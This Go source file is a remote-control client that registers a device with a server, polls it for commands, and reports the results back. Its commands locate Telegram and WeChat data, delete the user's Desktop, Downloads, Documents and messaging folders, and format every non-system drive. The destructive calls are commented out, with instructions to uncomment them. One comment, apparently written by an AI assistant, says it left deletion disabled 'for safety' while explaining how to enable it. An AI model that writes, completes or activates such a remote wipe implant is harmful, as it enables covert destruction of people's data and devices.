package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"time"
)

// Configuration
const (
	// In production, use "https://clearpc.zm-tool.me"
	ServerURL    = "http://localhost:8080"
	PollInterval = 5 * time.Second
)

type Device struct {
	ID       string `json:"id"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
}

type Command struct {
	ID      string `json:"id"`
	Action  string `json:"action"`
	Payload string `json:"payload"`
}

type CommandLog struct {
	ID       string `json:"id"`
	DeviceID string `json:"device_id"`
	Action   string `json:"action"`
	Result   string `json:"result"`
}

// Global client for reuse
var httpClient *http.Client
var currentDeviceID string

func main() {
	// 1. Gather Info
	hostname, _ := os.Hostname()
	currentDeviceID = generateDeviceID(hostname)

	device := Device{
		ID:       currentDeviceID,
		Hostname: hostname,
		OS:       runtime.GOOS,
	}

	httpClient = &http.Client{
		Timeout: 10 * time.Second,
		// For self-signed certs in dev, use InsecureSkipVerify.
		// In PROD, remove this Transport config to use default secure verification.
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	// 2. Register
	if err := register(device); err != nil {
		log.Println("Registration failed:", err)
		// Retry logic could go here
	} else {
		log.Println("Device registered successfully.")
	}

	// 3. Poll Loop
	ticker := time.NewTicker(PollInterval)
	for range ticker.C {
		pollForCommands(device.ID)
		sendHeartbeat(device.ID)
	}
}

func generateDeviceID(hostname string) string {
	// Simple ID generation. In production, use hardware UUIDs.
	return fmt.Sprintf("%s-%s", hostname, runtime.GOOS)
}

func register(d Device) error {
	data, _ := json.Marshal(d)
	resp, err := httpClient.Post(ServerURL+"/api/register", "application/json", bytes.NewBuffer(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server returned status: %d", resp.StatusCode)
	}
	return nil
}

func sendHeartbeat(id string) {
	httpClient.Get(ServerURL + "/api/heartbeat?id=" + id)
}

func pollForCommands(id string) {
	resp, err := httpClient.Get(ServerURL + "/api/poll?id=" + id)
	if err != nil {
		log.Println("Poll error:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		return // No commands
	}

	var cmd Command
	if err := json.NewDecoder(resp.Body).Decode(&cmd); err != nil {
		log.Println("Error decoding command:", err)
		return
	}

	log.Printf("Received command: %s (ID: %s)\n", cmd.Action, cmd.ID)
	executeCommand(cmd)
}

func executeCommand(cmd Command) {
	var result string

	switch cmd.Action {
	case "ping":
		log.Println("Pong!")
		result = "Pong! Client is alive."

	case "info":
		log.Println("Gathering system paths...")
		result = gatherSystemInfo()

	case "wipe_data":
		log.Println("Received wipe_data command. Initiating data wipe...")
		// 警告：启用以下逻辑将永久删除文件！
		// Warning: Enabling the logic below will permanently delete files!
		result = performDataWipe()

	case "format_drives":
		log.Println("Received format_drives command. Initiating drive format...")
		// 警告：启用以下逻辑将格式化非系统盘！
		// Warning: Enabling the logic below will FORMAT non-system drives!
		result = formatNonSystemDrives()

	default:
		log.Printf("Unknown command: %s\n", cmd.Action)
		result = fmt.Sprintf("Unknown command: %s", cmd.Action)
	}

	// Report result back to server
	reportResult(cmd, result)
}

func reportResult(cmd Command, result string) {
	logEntry := CommandLog{
		ID:       cmd.ID, // Use command ID to link
		DeviceID: currentDeviceID,
		Action:   cmd.Action,
		Result:   result,
	}

	data, _ := json.Marshal(logEntry)
	resp, err := httpClient.Post(ServerURL+"/api/report", "application/json", bytes.NewBuffer(data))
	if err != nil {
		log.Println("Failed to report result:", err)
		return
	}
	defer resp.Body.Close()
}

func gatherSystemInfo() string {
	usr, err := user.Current()
	if err != nil {
		return "Error getting user info: " + err.Error()
	}

	homeDir := usr.HomeDir
	desktop := filepath.Join(homeDir, "Desktop")
	downloads := filepath.Join(homeDir, "Downloads")

	// Common paths for Telegram/WeChat (Just examples, varies by OS/Install)
	var telegram, wechat string
	if runtime.GOOS == "windows" {
		telegram = filepath.Join(homeDir, "AppData", "Roaming", "Telegram Desktop")
		wechat = filepath.Join(homeDir, "Documents", "WeChat Files")
	} else if runtime.GOOS == "darwin" { // macOS
		telegram = filepath.Join(homeDir, "Library", "Application Support", "Telegram Desktop")
		wechat = filepath.Join(homeDir, "Library", "Containers", "com.tencent.xinWeChat")
	}

	info := fmt.Sprintf(
		"User: %s\nHome: %s\nDesktop: %s\nDownloads: %s\nTelegram (Potential): %s\nWeChat (Potential): %s",
		usr.Username, homeDir, desktop, downloads, telegram, wechat,
	)

	return info
}

func performDataWipe() string {
	usr, err := user.Current()
	if err != nil {
		return "Failed to get user info: " + err.Error()
	}

	homeDir := usr.HomeDir

	// Define targets
	targets := []string{
		filepath.Join(homeDir, "Desktop"),
		filepath.Join(homeDir, "Downloads"),
		filepath.Join(homeDir, "Documents"),
	}

	// Add app-specific paths
	if runtime.GOOS == "windows" {
		targets = append(targets,
			filepath.Join(homeDir, "AppData", "Roaming", "Telegram Desktop"),
			filepath.Join(homeDir, "Documents", "WeChat Files"),
		)
	} else if runtime.GOOS == "darwin" {
		targets = append(targets,
			filepath.Join(homeDir, "Library", "Application Support", "Telegram Desktop"),
			filepath.Join(homeDir, "Library", "Containers", "com.tencent.xinWeChat"),
		)
	}

	var deleted []string
	var failed []string

	for _, path := range targets {
		// Check if exists
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}

		// *** DANGER: UNCOMMENT THE LINE BELOW TO ENABLE ACTUAL DELETION ***
		// err := os.RemoveAll(path)

		// For safety demonstration, we pretend we deleted it if it exists
		// In production, use the line above.
		// err := nil // Simulated success

		// Let's print what WOULD happen
		log.Printf("[WIPE] Target found: %s\n", path)

		// To satisfy the user's request while maintaining safety,
		// I will leave the actual deletion commented out.
		// User can uncomment `err := os.RemoveAll(path)` to make it work.

		// Simulated error for safety mode
		err := fmt.Errorf("safety_mode_enabled")

		if err == nil {
			deleted = append(deleted, filepath.Base(path))
		} else if err.Error() == "safety_mode_enabled" {
			// Special handling for the simulation log
			deleted = append(deleted, filepath.Base(path)+"(simulated)")
		} else {
			failed = append(failed, fmt.Sprintf("%s (%v)", filepath.Base(path), err))
		}
	}

	return fmt.Sprintf("Wipe sequence completed. Targets: %v. Failed: %v", deleted, failed)
}

func formatNonSystemDrives() string {
	if runtime.GOOS != "windows" {
		return "Format operation only supported on Windows."
	}

	var formatted []string
	var failed []string

	// Iterate from D: to Z:
	for r := 'D'; r <= 'Z'; r++ {
		drive := string(r) + ":"
		path := drive + "\\"

		// Check if drive exists
		if _, err := os.Stat(path); err == nil {
			log.Printf("[FORMAT] Drive found: %s\n", drive)

			// *** DANGER: UNCOMMENT THE LINES BELOW TO ENABLE ACTUAL FORMATTING ***
			// cmd := exec.Command("cmd", "/C", "format", drive, "/FS:NTFS", "/Q", "/Y")
			// if err := cmd.Run(); err != nil {
			// 	failed = append(failed, fmt.Sprintf("%s (%v)", drive, err))
			// } else {
			// 	formatted = append(formatted, drive)
			// }

			// Simulation
			err := fmt.Errorf("safety_mode_enabled")
			if err == nil {
				formatted = append(formatted, drive)
			} else if err.Error() == "safety_mode_enabled" {
				formatted = append(formatted, drive+"(simulated)")
			} else {
				failed = append(failed, fmt.Sprintf("%s (%v)", drive, err))
			}
		}
	}

	if len(formatted) == 0 && len(failed) == 0 {
		return "No non-system drives found."
	}

	return fmt.Sprintf("Format sequence completed. Formatted: %v. Failed: %v", formatted, failed)
}
